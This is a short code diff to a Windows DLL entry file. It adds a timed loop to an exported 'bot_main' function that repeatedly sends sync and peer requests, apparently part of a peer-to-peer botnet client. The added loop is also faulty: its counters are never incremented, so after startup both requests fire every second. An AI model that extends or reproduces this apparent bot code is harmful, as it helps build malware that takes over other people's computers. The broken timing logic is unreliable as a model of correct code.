@@ -1,10 +1,15 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
 
+#define SYNC_RATE_SEC 40
+#define PEER_REQUEST_SEC 60
+
 #include "network.h"
 #include "communication.h"
 #include "ipc_manage.h"
 
+
 #include <stdio.h>
+#include <time.h>
 #include <Windows.h>
 
 BOOL APIENTRY DllMain(
@@ -31,8 +36,19 @@ extern "C" __declspec(dllexport) void bot_main()
     IPC_INIT();
     HANDLE ipc_results = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)handle_ipc_results, NULL, 0, NULL);
     HANDLE communication = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)handle_incomings, NULL, 0, NULL);
+    
+    clock_t time;
+    int sync_counter = 0, peer_counter = 0;
 
-    sync_request();
+    for (;;)
+    {
+        time = clock();
+        if (time > sync_counter * SYNC_RATE_SEC * 1000)
+            sync_request();
+        if (time > peer_counter * PEER_REQUEST_SEC * 1000)
+            peer_request();
+        Sleep(1000);
+    }
 
     getc(stdin);
 }
